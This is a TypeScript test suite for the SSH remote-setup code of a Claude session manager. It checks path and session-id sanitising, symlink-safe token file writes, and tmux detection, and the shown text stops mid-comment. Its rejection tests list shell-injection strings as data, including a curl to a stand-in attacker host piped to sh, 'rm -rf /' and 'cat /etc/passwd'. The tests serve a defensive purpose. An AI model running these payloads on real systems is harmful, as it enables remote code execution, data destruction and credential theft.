import { describe, it, expect, vi } from 'vitest'
import { readFileSync } from 'fs'
import * as nodePath from 'path'

// P7.8: getConductorMcpPort returns 0 unless the server has actually bound,
// which never happens in the test sandbox. Mock to a non-zero port so the
// setup-script tests below exercise the `hasVision=true` branch (writes
// canonical SSE schema + cccSessionId URL bake). One test below
// explicitly flips to 0 to cover the empty-mcpServers branch.
let mockedConductorMcpPort = 19333
vi.mock('../../../../src/main/conductor-mcp-server', () => ({
  getConductorMcpPort: () => mockedConductorMcpPort,
  // GHSA-q83v: the remote config now carries HMAC(secret, sessionId), not the
  // raw secret. Deterministic session-specific stub so the assertion proves
  // THIS session's token is baked in.
  mcpSessionToken: (sessionId: string) => `tok-${sessionId}`,
}))

import { ClaudeProvider } from '../../../../src/main/providers/claude'
import { generateRemoteSetupScript, assertSafeRemotePath, getRemoteSetupCommand, buildTmuxBinPatchCommand, buildRemoteTmuxKillCommand, buildContainerKillCommand, generateWindowsRemoteSetupScript, getWindowsRemoteSetupCommand, buildWindowsClaudeCommand } from '../../../../src/main/providers/claude/ssh-shim'

// #242 finding F1 (b): generateRemoteSetupScript/getRemoteSetupCommand/
// configureRemoteSettings now require a nonce.
const NONCE = 'testnonce123abc'

describe('ClaudeProvider SSH-capable surface', () => {
  it('configureRemoteSettings produces a base64-piped node command', () => {
    const p = new ClaudeProvider()
    const cmd = p.configureRemoteSettings('sid-x', '~/repo', null, undefined, NONCE)
    expect(cmd).toContain('base64 -d | node')
    // `cd --` defends against a path that begins with a dash being parsed as a flag.
    expect(cmd).toContain('cd -- ~/repo')
  })

  it('getSshSettingsPath returns ~/.claude/settings-<safeSid>.json', () => {
    const p = new ClaudeProvider()
    expect(p.getSshSettingsPath('sid-1')).toBe('~/.claude/settings-sid-1.json')
  })

  it('sanitizes session id in settings path', () => {
    const p = new ClaudeProvider()
    expect(p.getSshSettingsPath('sid/with*bad:chars')).toBe('~/.claude/settings-sid_with_bad_chars.json')
  })

  // P7.8 -- per-session --mcp-config path mirrors --settings path layout
  it('getSshMcpConfigPath returns ~/.claude/mcp-<safeSid>.json', () => {
    const p = new ClaudeProvider()
    expect(p.getSshMcpConfigPath('sid-1')).toBe('~/.claude/mcp-sid-1.json')
  })

  it('sanitizes session id in mcp-config path the same way as settings path', () => {
    const p = new ClaudeProvider()
    expect(p.getSshMcpConfigPath('sid/with*bad:chars')).toBe('~/.claude/mcp-sid_with_bad_chars.json')
  })
})

describe('SSH remotePath injection defence', () => {
  it.each([
    '~',
    '~/repo',
    '~user/work',
    '/home/me/project',
    './rel/path',
    '/srv/foo-bar_1.2',
  ])('accepts safe path %s', (p) => {
    expect(() => assertSafeRemotePath(p)).not.toThrow()
  })

  it.each([
    '~; curl attacker/evil.sh | sh #',
    '~ && rm -rf /',
    '`whoami`',
    '$(id)',
    '~/repo;ls',
    '~/repo|cat /etc/passwd',
    '~/repo with space',
    "~/'quote'",
    '~/"dquote"',
    '~/path\nNL',
    '~/repo>out',
  ])('rejects unsafe path %s', (p) => {
    expect(() => assertSafeRemotePath(p)).toThrow(/Refusing to build SSH setup command/)
  })

  it('getRemoteSetupCommand throws on a metacharacter-laden remotePath rather than interpolating it', () => {
    expect(() =>
      getRemoteSetupCommand('sid-x', '~; curl evil.sh | sh #', null, undefined, NONCE),
    ).toThrow(/Refusing to build SSH setup command/)
  })

  it('getRemoteSetupCommand uses `cd --` so a leading-dash path is treated as an operand', () => {
    const cmd = getRemoteSetupCommand('sid-x', '~/repo', null, undefined, NONCE)
    expect(cmd).toContain(' cd -- ~/repo ')
  })
})

describe('SSH remote setup script (P7.8 -- --mcp-config migration)', () => {
  it('writes a per-session mcp-config file with the canonical SSE schema and conductor key', () => {
    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
    // Path: ~/.claude/mcp-<sid>.json
    expect(script).toContain(`path.join(claudeDir,'mcp-sid-x.json')`)
    // The mcpConfig literal is JSON-stringified twice (once for the JSON
    // content, once for embedding as a JS string literal in the script),
    // so quotes appear as \" in the script source. Match the escaped form.
    expect(script).toContain('\\"conductor\\"')
    expect(script).toContain('\\"type\\":\\"sse\\"')
    // Old name absent from the mcp-config WRITE literal -- only present
    // in the strip-legacy cleanup code further down. Pin via the
    // writeFileSync(mcpPath, ...) literal so the assertion can't be
    // satisfied by an unrelated reference to 'conductor' elsewhere in
    // the script.
    const writeMatch = script.match(/fs\.writeFileSync\(mcpPath,"([^"\\]|\\.)*",\{mode:0o600,flag:'wx'\}\)/)
    expect(writeMatch).not.toBeNull()
    expect(writeMatch![0]).toContain('conductor')
    expect(writeMatch![0]).not.toContain('conductor-vision')
  })

  // First-connect priming (harmonise-remote UX): the setup script spawns the
  // shim once, detached, so account + usage buckets reach the app and the usage
  // cache warms BEFORE claude's first statusline tick. It reuses the shim file
  // just written (shimPath), THIS session's safeSid, and the same 0600 url file
  // (urlPath) the statusLine command uses — no new remote code, no new secret
  // path. Live-proven on a cold Pi connect: update #0 carried account+Fable.
  it('primes one detached shim run (warm cache + early account/buckets) when a tunnel URL exists', () => {
    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
    // Spawns the SHIM FILE (not a fresh script), with the session's safeSid and
    // the url file, feeding a minimal {session_id} on stdin — and never blocks
    // setup on it (unref).
    expect(script).toContain('spawn(process.execPath,[shimPath,"sid-x",urlPath]')
    expect(script).toContain('JSON.stringify({session_id:"sid-x"})')
    expect(script).toContain('_pr.unref()')
    // The priming must sit BEFORE the completion sentinel so it launches during
    // setup, not after claude is already up.
    expect(script.indexOf('spawn(process.execPath,[shimPath')).toBeLessThan(script.indexOf('setup ok'))
  })

  it('omits the priming spawn when there is no tunnel URL (conductor MCP off)', () => {
    // includeConductorMcp:false => statusUrl is empty => no priming (nothing to
    // POST to; the shim's OSC fallback has no tty from a detached spawn anyway).
    const script = generateRemoteSetupScript('sid-x', null, { includeStatusLine: true, includeConductorMcp: false }, NONCE)
    expect(script).not.toContain('spawn(process.execPath,[shimPath')
  })

  it('bakes ?cccSessionId=<encoded sid> into the remote MCP URL (P7.7.10 parity)', () => {
    const script = generateRemoteSetupScript('sid+with space', null, undefined, NONCE)
    // encodeURIComponent maps "+" -> "%2B" and " " -> "%20"
    expect(script).toContain('?cccSessionId=sid%2Bwith%20space')
  })

  it('bakes this session\'s per-session token into the remote MCP URL (GHSA-q83v)', () => {
    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
    expect(script).toContain('&token=tok-sid-x')
  })

  // #242 finding F2 (MAJOR, adversarial review round 5): ssh-shim.ts:200
  // used to interpolate the RAW sessionId into statusLine.command -- the one
  // embedding that skipped `safeSid`, unlike settings-<safeSid>.json and
  // mcp-<safeSid>.json below it. Reachability is gated at the IPC boundary
  // (sessionIdSchema, see pty-handlers-sessionid.test.ts) and this is
  // hardening on the same footing as the #241 username/host fix, not an
  // embargoed vulnerability -- but the sink itself must still use safeSid.
  // Mutation to prove this can fail: revert ssh-shim.ts:200's
  // `${safeSid}` back to `${sessionId}` -- the raw hostile id then appears
  // verbatim in the statusLine.command string and this assertion fails.
  it('never embeds a raw hostile sessionId in statusLine.command -- always the sanitised safeSid', () => {
    const hostile = 'x;id'
    const script = generateRemoteSetupScript(hostile, null, undefined, NONCE)
    const parts = script.split(`Object.assign({},sBase,{`)
    expect(parts.length).toBeGreaterThanOrEqual(2)
    const sesCfgBody = parts[1].split('})')[0]
    expect(sesCfgBody).not.toContain(hostile)
    expect(sesCfgBody).toContain('CLAUDE_MULTI_SESSION_ID=x_id')
  })

  it('strips BOTH legacy conductor-vision AND conductor entries from shared settings + ~/.claude.json', () => {
    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
    // Shared settings.json: both keys defensively removed
    expect(script).toContain(`s.mcpServers['conductor-vision']`)
    expect(script).toContain(`s.mcpServers['conductor']`)
    expect(script).toContain(`delete s.mcpServers['conductor-vision']`)
    expect(script).toContain(`delete s.mcpServers['conductor']`)
    // ~/.claude.json cleanup also defensive on both names
    expect(script).toContain(`c.mcpServers['conductor-vision']`)
    expect(script).toContain(`c.mcpServers['conductor']`)
  })

  it('per-session settings file does NOT carry mcpServers (claude ignores it there)', () => {
    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
    // The clone deletes mcpServers before applying CCC overrides.
    expect(script).toContain(`delete sBase.mcpServers`)
    // sesCfg construction merges sBase + statusLine + (optional hooks); no
    // mcpServers key is added back -- assert no literal mcpServers in the
    // per-session settings write path. Require the anchor match to succeed
    // so a future refactor that renames sBase or reformats spacing fails
    // loudly rather than turning the assertion into a silent no-op.
    const parts = script.split(`Object.assign({},sBase,{`)
    expect(parts.length).toBeGreaterThanOrEqual(2)
    const sesCfgLine = parts[1].split(`})`)[0]
    expect(sesCfgLine.length).toBeGreaterThan(0)
    expect(sesCfgLine).not.toContain('mcpServers')
  })

  // Master status-line switch (onboarding p4): includeStatusLine=false must
  // omit the statusLine stanza from the per-session settings while leaving
  // the rest of the setup (hooks, mcp, legacy cleanup) intact.
  it('includes the statusLine stanza by default', () => {
    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
    expect(script).toContain(`statusLine:{type:'command'`)
  })

  // #265 finding 3: the sessionId embedded in the statusLine `command` was the
  // one raw-value path left in this file. That value lands inside a
  // single-quoted JS string literal in the emitted setup script AND becomes the
  // command claude runs via `sh -c`, so a raw id with a quote/space/
  // metacharacter is remote code execution / command splitting. It must be the
  // sanitised safeSid (a no-op for real hex ids).
  // #242 inserts `CCC_TMUX_BIN=...` between the sid and ` node`, so assert on
  // the sanitised sid token followed by a space (the env-var boundary), not the
  // literal `<sid> node` adjacency the pre-#242 command had.
  it('embeds the sanitised safeSid — not the raw id — in the statusLine command', () => {
    const script = generateRemoteSetupScript("a'b", null, undefined, NONCE)
    expect(script).toContain('CLAUDE_MULTI_SESSION_ID=a_b ')
    expect(script).not.toContain("CLAUDE_MULTI_SESSION_ID=a'b")
  })

  it('leaves a real (hex) id untouched in the statusLine command', () => {
    const script = generateRemoteSetupScript('9f1f147ea02f2cf7d1eec041', null, undefined, NONCE)
    expect(script).toContain('CLAUDE_MULTI_SESSION_ID=9f1f147ea02f2cf7d1eec041 ')
  })

  it('includeStatusLine=false omits the statusLine stanza from the per-session settings', () => {
    const script = generateRemoteSetupScript('sid-x', null, { includeStatusLine: false }, NONCE)
    const parts = script.split(`Object.assign({},sBase,{`)
    expect(parts.length).toBeGreaterThanOrEqual(2)
    const sesCfgLine = parts[1].split(`})`)[0]
    expect(sesCfgLine).not.toContain('statusLine')
    // The shim file is still staged (inert without the stanza) and the
    // legacy-global cleanup still runs.
    expect(script).toContain('conductor-ssh-statusline.js')
  })

  // Master-off + legacy remote: the per-session clone must strip a legacy
  // shared statusLine stanza BEFORE the clone is written, or the first
  // post-upgrade connect inherits it despite the master being off (the
  // shared-file heal runs after the clone is taken).
  it('strips a legacy statusLine stanza from the sBase clone itself', () => {
    const script = generateRemoteSetupScript('sid-x', null, { includeStatusLine: false }, NONCE)
    expect(script).toContain('delete sBase.statusLine')
    // Ordering: the sBase strip appears before the per-session settings write.
    expect(script.indexOf('delete sBase.statusLine')).toBeLessThan(script.indexOf('sesPath'))
  })

  it('configureRemoteSettings threads the master-switch opts through to the script', () => {
    const p = new ClaudeProvider()
    const on = p.configureRemoteSettings('sid-x', '~/repo', null, undefined, NONCE)
    const off = p.configureRemoteSettings('sid-x', '~/repo', null, { includeStatusLine: false }, NONCE)
    expect(on).not.toBe(off)
  })

  // Built-in tools master (onboarding p6): off = empty remote mcpServers,
  // exactly like the port-0 fallback; statusline is independent of this flag.
  it('includeConductorMcp=false writes empty remote mcpServers (no built-in tools)', () => {
    const script = generateRemoteSetupScript('sid-x', null, { includeConductorMcp: false }, NONCE)
    const writeMatch = script.match(/fs\.writeFileSync\(mcpPath,"([^"\\]|\\.)*",\{mode:0o600,flag:'wx'\}\)/)
    expect(writeMatch).not.toBeNull()
    expect(writeMatch![0]).toContain('\\"mcpServers\\":{}')
    expect(writeMatch![0]).not.toContain('conductor')
    expect(script).toContain(`statusLine:{type:'command'`)
  })

  // P7.8 parity with writeLocalSessionMcpConfig: when the conductor server
  // hasn't bound yet (port=0), write an empty mcpServers object rather than
  // pointing at a phantom port. Mirrors the local writer's behaviour and
  // avoids silently dispatching SSH sessions to whatever process owns 19333.
  it('writes empty mcpServers when the conductor server has not bound (port=0)', () => {
    mockedConductorMcpPort = 0
    try {
      const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
      const writeMatch = script.match(/fs\.writeFileSync\(mcpPath,"([^"\\]|\\.)*",\{mode:0o600,flag:'wx'\}\)/)
      expect(writeMatch).not.toBeNull()
      // Empty mcpServers literal: {"mcpServers":{}} -> doubly-stringified
      // becomes the substring \"mcpServers\":{} inside the script source.
      expect(writeMatch![0]).toContain('\\"mcpServers\\":{}')
      expect(writeMatch![0]).not.toContain('conductor')
      expect(writeMatch![0]).not.toContain('cccSessionId')
    } finally {
      mockedConductorMcpPort = 19333
    }
  })
})

// GHSA-phr3-g5qh-q4v5: the remote ~/.claude is hardened even when it
// PRE-EXISTS, and the token-bearing writes cannot be redirected through a
// planted symlink. mkdir's mode is create-only, so a pre-existing 0755 dir
// (the common case) was never repaired and the rmSync->write pair followed a
// re-planted link. Both halves of the fix are asserted on the emitted script;
// each was verified to fail against the pre-fix code.
describe('SSH remote ~/.claude hardening (GHSA-phr3-g5qh-q4v5)', () => {
  it('re-asserts 0700 on the dir unconditionally, not only on mkdir create', () => {
    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
    // The chmod must be its own statement, so a pre-existing dir is repaired.
    expect(script).toContain('fs.chmodSync(claudeDir,0o700)')
    // And it must come before any write into the dir, so the writes land in an
    // already-locked-down directory (the shim write is the first).
    expect(script.indexOf('fs.chmodSync(claudeDir,0o700)')).toBeLessThan(script.indexOf('writeFileSync(shimPath'))
  })

  it('creates BOTH token-bearing files exclusively (flag wx), refusing a re-planted link', () => {
    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
    // settings-<sid>.json (hook token) and mcp-<sid>.json (?token= secret):
    // exclusive create so a symlink planted in the rmSync->write window is
    // refused with EEXIST rather than followed.
    expect(script).toMatch(/fs\.writeFileSync\(sesPath,[^;]*,\{mode:0o600,flag:'wx'\}\)/)
    expect(script).toMatch(/fs\.writeFileSync\(mcpPath,[^;]*,\{mode:0o600,flag:'wx'\}\)/)
    // The unlink stays as the legitimate-leftover path, paired with each write.
    expect(script).toContain(`fs.rmSync(sesPath,{force:true})`)
    expect(script).toContain(`fs.rmSync(mcpPath,{force:true})`)
  })

  it('does not claim the mkdir mode alone blocks a planted link (comment corrected)', () => {
    // The old inline comment asserted "the 0700 dir blocks a planted link",
    // which is false for a pre-existing dir. It is source-only, but pin it so
    // the overstatement cannot quietly return.
    const src = readFileSync(
      new URL('../../../../src/main/providers/claude/ssh-shim.ts', import.meta.url),
      'utf8',
    )
    expect(src).not.toContain('the 0700 dir blocks a planted link')
  })
})

// #242 finding F3 (MAJOR, adversarial review round 5): after a tier-3/4
// stage/push succeeds, pty-manager must rewrite the ALREADY-WRITTEN
// settings-<safeSid>.json's CCC_TMUX_BIN before the claude launch write --
// see buildTmuxBinPatchCommand's doc comment for the full mechanism.
//
// #242 finding F1(a), round-2 correction: buildTmuxBinPatchCommand no longer
// takes a `tmuxBin` parameter -- the emitted script computes
// `path.join(os.homedir(),'.claude','bin','tmux')` itself, evaluated on the
// REMOTE at runtime, rather than trusting a host-supplied value that
// ultimately traces back to a wire-reported (and therefore
// attacker-influenceable) path.
describe('buildTmuxBinPatchCommand (#242 finding F3)', () => {
  it('produces a base64-piped node command', () => {
    const cmd = buildTmuxBinPatchCommand('sid-x')
    expect(cmd).toMatch(/^echo '[A-Za-z0-9+\/=]+' \| base64 -d \| node 2>\/dev\/null$/)
  })

  it('decodes to a script that reads settings-<safeSid>.json and rewrites CCC_TMUX_BIN in place, computed from the REMOTE os.homedir()', () => {
    const cmd = buildTmuxBinPatchCommand('sid-x')
    const m = cmd.match(/echo '([A-Za-z0-9+\/=]+)'/)
    expect(m).not.toBeNull()
    const decoded = Buffer.from(m![1], 'base64').toString('utf8')
    expect(decoded).toContain(`'settings-sid-x.json'`)
    expect(decoded).toContain('CCC_TMUX_BIN=')
    expect(decoded).toContain(`path.join(os.homedir(),'.claude','bin','tmux')`)
    expect(decoded).toContain('statusLine.command')
  })

  // #242 finding I4: the computed tmuxBin is real remote output
  // (os.homedir()), not wire-controlled, but its sibling in
  // generateRemoteSetupScript (the `tmuxPath` guard) re-checks the identical
  // class of value against the SAME allowlist right before the SAME sink
  // (statusLine.command) -- this patch script must apply the SAME guard,
  // and skip the whole patch (leaving whatever CCC_TMUX_BIN was already
  // baked in) rather than splice an unguarded value into the sink.
  it('applies the SAME charset guard as generateRemoteSetupScript before splicing tmuxBin into statusLine.command', () => {
    const cmd = buildTmuxBinPatchCommand('sid-x')
    const m = cmd.match(/echo '([A-Za-z0-9+\/=]+)'/)
    const decoded = Buffer.from(m![1], 'base64').toString('utf8')
    expect(decoded).toContain(`if(!/^[A-Za-z0-9_./-]+$/.test(tmuxBin))tmuxBin=''`)
    const guardIdx = decoded.indexOf(`if(!/^[A-Za-z0-9_./-]+$/.test(tmuxBin))tmuxBin=''`)
    const replaceIdx = decoded.indexOf('statusLine.command=')
    expect(guardIdx).toBeGreaterThan(-1)
    expect(replaceIdx).toBeGreaterThan(-1)
    expect(guardIdx).toBeLessThan(replaceIdx)
    // The replace itself is gated on a non-empty tmuxBin -- a failed guard
    // must skip the patch entirely, not write an empty CCC_TMUX_BIN=.
    expect(decoded).toContain(`if(tmuxBin&&s.statusLine&&typeof s.statusLine.command==='string')`)
  })

  it('sanitizes a hostile sessionId into the same safeSid form the settings filename uses', () => {
    const cmd = buildTmuxBinPatchCommand('x;id')
    const m = cmd.match(/echo '([A-Za-z0-9+\/=]+)'/)
    const decoded = Buffer.from(m![1], 'base64').toString('utf8')
    expect(decoded).toContain(`'settings-x_id.json'`)
    expect(decoded).not.toContain('x;id')
  })

  it('is deterministic for the same input', () => {
    expect(buildTmuxBinPatchCommand('sid-x')).toBe(
      buildTmuxBinPatchCommand('sid-x'),
    )
  })

  // ADR-009 ordering invariant. CCC_STATUS_URL_FILE was placed AFTER
  // CCC_TMUX_BIN in the statusLine command, so this patch's `/CCC_TMUX_BIN=\S*/`
  // rewrite must stop at the space between them. Put the new var FIRST (or drop
  // the space) and the rewrite would swallow it, taking the whole tier-0
  // delivery with it on every host that reaches tier 3/4 — a silent statusline
  // death on exactly the hosts the patch exists to serve.
  // Mutation to prove this can fail: emit `CCC_STATUS_URL_FILE=…CCC_TMUX_BIN=…`.
  it("the patch's CCC_TMUX_BIN rewrite leaves CCC_STATUS_URL_FILE intact in the real generated command", () => {
    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
    // The command as the emitted script builds it, with the two remote-side
    // consts resolved the way the remote node would resolve them.
    const built = script
      .match(/command:'([^']*)'\+tmuxPath\+' CCC_STATUS_URL_FILE='\+urlPath\+' node '\+shimPath/)
    expect(built).not.toBeNull()
    const command = `${built![1]}` + '' + ` CCC_STATUS_URL_FILE=/home/u/.claude/ccc-status-sid-x.url node /home/u/.claude/conductor-ssh-statusline.js`
    // Empty tmux bin (the tier-1/2 miss that makes this patch run at all).
    expect(command).toContain('CCC_TMUX_BIN= CCC_STATUS_URL_FILE=')
    const patched = command.replace(/CCC_TMUX_BIN=\S*/, 'CCC_TMUX_BIN=/home/u/.claude/bin/tmux')
    expect(patched).toContain('CCC_TMUX_BIN=/home/u/.claude/bin/tmux')
    expect(patched).toContain('CCC_STATUS_URL_FILE=/home/u/.claude/ccc-status-sid-x.url')
    expect(patched).toContain(' node /home/u/.claude/conductor-ssh-statusline.js')
  })
})

// #242 MAJOR: tier 1/2 tmux detection had ZERO coverage -- reverting the
// entire hunk (dropping both probes, restoring the bare `setup ok\n`
// sentinel) left the full suite green. Pin each piece individually.
describe('SSH remote setup script -- tmux detection (#242)', () => {
  it('probes PATH via the `command -v tmux` shell builtin (tier 1)', () => {
    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
    expect(script).toContain(`execSync('command -v tmux'`)
  })

  it('falls back to ~/.claude/bin/tmux with an X_OK access check (tier 2)', () => {
    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
    expect(script).toContain(`path.join(claudeDir,'bin','tmux')`)
    expect(script).toContain('fs.constants.X_OK')
  })

  it('ends the script with the tmux-carrying sentinel, not the bare "setup ok"', () => {
    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
    // #242 round-3 correction (I3): the sentinel carries a fixed CLASS
    // (`tmuxClass`), never `tmuxPath` -- there is no wire-reported path left
    // for tier 1/2 to influence a launch command with.
    expect(script).toContain(`process.stdout.write('setup ok ${NONCE} tmux='+tmuxClass+'`)
    // The pre-#242 bare sentinel wrote exactly 'setup ok\n' with nothing
    // else on the line -- assert that exact literal is gone, not merely
    // that the new one was added alongside it.
    expect(script).not.toContain(`process.stdout.write('setup ok\\n')`)
  })
})

// ===========================================================================
// Follow-up adversarial pass (fail-posture) — two remote-probe fixes:
//   1. tier-2 must EXECUTE the ~/.claude/bin/tmux candidate (`-V`, bounded)
//      before reporting class `home` — X_OK alone is satisfied by a zero-byte
//      file, a half-written download, a wrong-arch binary and even a DIRECTORY
//      named `tmux` (POSIX X_OK on a searchable dir succeeds), each of which
//      wrapped every future launch on that host in a binary that cannot run;
//   2. a login shell ALREADY inside tmux ($TMUX set — the common
//      `[ -z "$TMUX" ] && exec tmux new -A` rc pattern) must report `none`:
//      nesting `new-session -A` is refused by tmux ("sessions should be
//      nested with care"), exit 1, no claude, on every connect.
// Text pins first, then a runtime harness (mirroring
// ssh-shim-runtime-harness.test.ts) that actually EXECUTES the generated
// setup script — substring assertions alone survive any refactor that keeps
// the text but reorders/loses the behaviour.
// ===========================================================================
describe('SSH remote setup script — tier-2 -V execution probe + nested-tmux override (fail-posture follow-up)', () => {
  // Mutation to prove this can fail: drop the execFileSync('-V') call from
  // the tier-2 probe line — both the containment and the ordering fail.
  it('the tier-2 probe EXECUTES the candidate (`-V`, bounded, output discarded) between the X_OK check and the `home` class assignment', () => {
    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
    expect(script).toContain(`execFileSync(cb,['-V'],{timeout:5000,stdio:'ignore'})`)
    // Order inside the one shared try: access -> execute -> assign, so a
    // throw from EITHER probe prevents `home` from ever being reported.
    const accessIdx = script.indexOf('fs.accessSync(cb,fs.constants.X_OK)')
    const execIdx = script.indexOf(`execFileSync(cb,['-V'],{timeout:5000,stdio:'ignore'})`)
    const assignHomeIdx = script.indexOf(`tmuxClass='home'`)
    expect(accessIdx).toBeGreaterThan(-1)
    expect(execIdx).toBeGreaterThan(accessIdx)
    expect(assignHomeIdx).toBeGreaterThan(execIdx)
  })

  // Mutation to prove this can fail: delete the override line — the
  // existence assertion fails (and the runtime tests below fail too).
  // Order matters: the override must come AFTER both the tier-1 and tier-2
  // assignments, or an assignment would simply overwrite it and the nested
  // remote would still get the doomed wrap.
  //
  // Statusline fix (SSBN root cause, 2026-08-27): the override clears ONLY
  // tmuxClass. The old form also wiped tmuxPath, which baked an empty
  // CCC_TMUX_BIN for every user-owned-tmux session — the shim then had no
  // way to reach the tmux client tty and the statusline froze on "pending".
  it('contains the $TMUX -> tmuxClass=none override (tmuxPath PRESERVED), AFTER both tier assignments', () => {
    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
    const override = `if(process.env.TMUX){tmuxClass='none'}`
    const overrideIdx = script.indexOf(override)
    expect(overrideIdx).toBeGreaterThan(-1)
    // The regression pin: the tmuxPath-wiping form must never come back.
    expect(script).not.toContain(`if(process.env.TMUX){tmuxPath='';tmuxClass='none'}`)
    const tier1Idx = script.indexOf(`tmuxClass='path'`)
    const tier2Idx = script.indexOf(`tmuxClass='home'`)
    expect(tier1Idx).toBeGreaterThan(-1)
    expect(tier2Idx).toBeGreaterThan(-1)
    expect(overrideIdx).toBeGreaterThan(tier1Idx)
    expect(overrideIdx).toBeGreaterThan(tier2Idx)
  })
})

// Runtime harness for the WHOLE generated setup script (the outer node
// script, not the statusline shim ssh-shim-runtime-harness.test.ts runs):
// `new Function('require','process',script)` with `require`/`process`
// shadowed by scripted stand-ins, capturing the sentinel the real remote
// would write to stdout. What class the sentinel carries under each remote
// condition IS the behaviour under test.
interface SetupRunResult {
  stdout: string
  execFileCalls: Array<{ file: string; args: string[] }>
  /** Every fs.writeFileSync the script performed (settings, shim, mcp, status URL),
   *  with the write OPTIONS — the mode/flag custody is part of the contract. */
  writes: Array<{ path: string; content: string; opts?: Record<string, unknown> }>
}

function runSetupScript(opts: {
  env: Record<string, string>
  /** tier 1 (`command -v tmux` via execSync): throw = not on PATH. */
  execSync: (cmd: string) => string
  /** tier 2 access probe: throw = candidate missing / not executable. */
  accessSync?: (p: string) => void
  /** tier 2 execution probe (`-V`): throw = candidate cannot actually run. */
  execFileSync?: (file: string, args: string[]) => string
}): SetupRunResult {
  const result: SetupRunResult = { stdout: '', execFileCalls: [], writes: [] }
  const enoent = (): Error => Object.assign(new Error('ENOENT'), { code: 'ENOENT' })
  const fakeFs = {
    mkdirSync: () => {},
    chmodSync: () => {},
    rmSync: () => {},
    writeFileSync: (p: string, content: unknown, wopts?: Record<string, unknown>) => { result.writes.push({ path: String(p), content: String(content), opts: wopts }) },
    readFileSync: () => { throw enoent() },
    existsSync: () => false,
    accessSync: (p: string) => { (opts.accessSync ?? (() => { throw enoent() }))(p) },
    constants: { X_OK: 1 },
  }
  const fakeChildProcess = {
    execSync: (cmd: string) => opts.execSync(cmd),
    execFileSync: (file: string, args: string[]) => {
      result.execFileCalls.push({ file, args })
      return (opts.execFileSync ?? (() => ''))(file, args)
    },
  }
  const fakeRequire = (name: string): unknown => {
    if (name === 'fs') return fakeFs
    if (name === 'os') return { homedir: () => '/fake-home' }
    // posix flavour deliberately: the script runs on a POSIX remote; the
    // host-side win32 path module would splice backslashes into the tier-2
    // candidate and trip the script's own charset guard for reasons no real
    // remote can reproduce.
    if (name === 'path') return nodePath.posix
    if (name === 'child_process') return fakeChildProcess
    throw new Error('setup-script harness: unexpected require: ' + name)
  }
  const fakeProcess = {
    env: opts.env,
    stdout: { write: (s: string) => { result.stdout += s; return true } },
  }
  const script = generateRemoteSetupScript('sid-rt', null, undefined, NONCE)
  // eslint-disable-next-line no-new-func -- deliberate: this IS the harness.
  new Function('require', 'process', script)(fakeRequire, fakeProcess)
  return result
}

/** The one location tier 2 ever probes, as the fake remote resolves it. */
const TIER2_CANDIDATE = '/fake-home/.claude/bin/tmux'

function sentinelTmuxClass(stdout: string): string | undefined {
  return stdout.match(new RegExp(`setup ok ${NONCE} tmux=(\\S+) acct=`))?.[1]
}

describe('SSH remote setup script — runtime behaviour of the tmux probes (fail-posture follow-up)', () => {
  // Mutation to prove this can fail: drop the execFileSync('-V') from the
  // tier-2 probe — with only X_OK consulted this reports `home` and
  // execFileCalls stays empty.
  it('a candidate that passes X_OK but cannot execute -V (zero-byte file, wrong arch, a directory) is NOT reported as home', () => {
    const r = runSetupScript({
      env: {},
      execSync: () => { throw new Error('command -v: not found') }, // tier 1 misses
      accessSync: () => {}, // X_OK passes — exactly the pre-fix trap
      execFileSync: () => { throw Object.assign(new Error('spawnSync ENOEXEC'), { code: 'ENOEXEC' }) },
    })
    expect(sentinelTmuxClass(r.stdout)).toBe('none')
    // The probe really EXECUTED the candidate, with -V, output discarded.
    expect(r.execFileCalls).toEqual([{ file: TIER2_CANDIDATE, args: ['-V'] }])
  })

  it('control: a candidate that passes X_OK AND runs -V IS reported as home', () => {
    const r = runSetupScript({
      env: {},
      execSync: () => { throw new Error('command -v: not found') },
      accessSync: () => {},
      execFileSync: () => 'tmux 3.5a\n',
    })
    expect(sentinelTmuxClass(r.stdout)).toBe('home')
  })

  // Mutation to prove this can fail: delete the
  // `if(process.env.TMUX){tmuxPath='';tmuxClass='none'}` line — this reports
  // `path` and pty-manager wraps the launch in a nested new-session tmux
  // refuses on every connect.
  it('a login shell ALREADY inside tmux ($TMUX set) reports tmux=none even when tier 1 found tmux on PATH', () => {
    const r = runSetupScript({
      env: { TMUX: '/tmp/tmux-1000/default,1234,0' },
      execSync: () => '/usr/bin/tmux\n', // tier 1 HITS — the override must beat it
    })
    expect(sentinelTmuxClass(r.stdout)).toBe('none')
  })

  it('control: without $TMUX the same tier-1 hit reports tmux=path', () => {
    const r = runSetupScript({
      env: {},
      execSync: () => '/usr/bin/tmux\n',
    })
    expect(sentinelTmuxClass(r.stdout)).toBe('path')
  })

  // Statusline fix (SSBN root cause, 2026-08-27) — mutation to prove this can
  // fail: restore the old tmuxPath-wiping override
  // (`if(process.env.TMUX){tmuxPath='';tmuxClass='none'}`) and the settings
  // bake goes back to `CCC_TMUX_BIN= ` (empty), which is exactly the state
  // that froze the statusline for user-owned-tmux sessions: claude still runs
  // INSIDE the user's tmux, the shim finds no tmux bin, falls back to the
  // pane pty, and tmux swallows the sentinel.
  it('nested-tmux ($TMUX set): class is none but the settings bake KEEPS the tier-1 tmux path for the shim', () => {
    const r = runSetupScript({
      env: { TMUX: '/tmp/tmux-1000/default,1234,0' },
      execSync: () => '/usr/bin/tmux\n', // tier 1 hits — the shim must get this
    })
    expect(sentinelTmuxClass(r.stdout)).toBe('none') // launch stays bare (no nesting)
    const settingsWrite = r.writes.find((w) => w.path.includes('settings-sid-rt'))
    expect(settingsWrite).toBeDefined()
    // The bin is followed by a SPACE, not end-of-command: the status-URL file
    // env var (ADR-009 token custody) sits between it and `node`, and
    // buildTmuxBinPatchCommand's /CCC_TMUX_BIN=\S*/ rewrite must stop at that
